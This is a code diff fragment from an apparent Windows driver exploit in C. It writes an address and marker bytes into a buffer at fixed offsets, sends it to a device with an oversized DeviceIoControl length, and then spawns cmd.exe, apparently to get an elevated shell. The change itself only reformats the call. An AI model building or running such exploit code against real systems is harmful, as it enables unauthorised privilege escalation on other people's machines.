@@ -52,7 +52,16 @@ int main()
 	memcpy(Buff + 0x828, plAddress, 4);
 	memcpy(Buff + 0x830 - 4, "\xb0\xb0\xd0\xba", 4);
 
-	DeviceIoControl(dev, 0x222027, &Buff, 0xFFFFFFFF, NULL, 0, &u, (LPOVERLAPPED)NULL);
+	DeviceIoControl(
+		dev,
+		0x222027,
+		&Buff,
+		0xFFFFFFFF,
+		NULL,
+		0,
+		&u,
+		(LPOVERLAPPED)NULL
+	);
 	system("cmd.exe");
 	CloseHandle(dev);
 	system("pause");
